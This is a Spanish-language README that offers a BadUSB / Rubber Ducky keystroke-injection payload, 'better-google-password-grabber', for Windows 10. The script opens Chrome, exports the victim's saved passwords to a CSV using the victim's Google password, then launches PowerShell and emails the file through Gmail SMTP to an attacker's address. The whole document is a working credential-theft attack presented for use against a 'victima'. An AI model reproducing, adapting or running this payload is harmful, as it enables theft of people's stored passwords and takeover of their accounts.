# better-google-password-grabber
Solia ocupar esos payloads para Rubber Ducky o bad-usb, muchos estan desactualizados ya que google implementa mas medidas de seguridad cada dia, en fin... para este payload necesitas la contraseña de la cuenta de google de la victima.




REM Author: DiegoJRV
REM Ducky chrome password stealer for Windows 10
Delay 1000
REM ----------- opens chrome web browser
GUI r
DELAY 500
STRING chrome
DELAY 400
ENTER
DELAY 600
REM ----------- exports passwords into csv file
STRING chrome://settings/passwords
ENTER
DELAY 1000
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
TAB
DELAY 100
ENTER
DELAY 200
F5
DELAY 1000
CTRL f
DELAY 1000
STRING ayuda
DELAY 1000
ENTER
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
ENTER
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 200
ENTER
DELAY 1000
CTRL f
DELAY 1000
STRING exportar contrase
DELAY 1000
ENTER
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
TAB
DELAY 1000
ENTER
DELAY 2000
TAB
DELAY 2000
ENTER
DELAY 1000
ENTER
DELAY 4000
STRING CONTRASEÑA DEL CORREO (VICTIMA)
DELAY 1000
ENTER
DELAY 7000
STRING chromepasswords.csv
DELAY 2000
ENTER
DELAY 1000
CONTROL W
DELAY 100
REM -------------- sends it by email using powershell
GUI r
DELAY 200
STRING powershell
ENTER
DELAY 500
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
DELAY 100
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
DELAY 100
STRING $SMTPInfo.EnableSSL = $true
ENTER
DELAY 100
REM ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('PARTE DEL CORREO QUE VA ANTES DEL ARROBA (CORREO QUE ENVIARA)
ALTGR q
STRING gmail.com', 'CONTRASEÑA DEL CORREO')
ENTER
DELAY 100
STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage
ENTER
DELAY 100
STRING $E.From = 'PARTE DEL CORREO QUE VA ANTES DEL ARROBA (CORREO QUE ENVIARA)
ALTGR q
STRING gmail.com'
ENTER
DELAY 100
STRING $E.To.Add('PARTE DEL CORREO QUE VA ANTES DEL ARROBA (CORREO QUE RECIBIRÁ)
ALTGR q
STRING gmail.com')
ENTER
DELAY 100
STRING $E.Subject = $env:UserName
ENTER
DELAY 100
STRING $E.Body = 'Success! The password file is attached!'
ENTER
DELAY 100
STRING $F = 'Downloads/chromepasswords.csv'
ENTER
DELAY 100
STRING $E.Attachments.Add($F)
ENTER
DELAY 100
STRING $F = $SMTPInfo.Send($E)
ENTER
DELAY 100
STRING exit
DELAY 100
ENTER
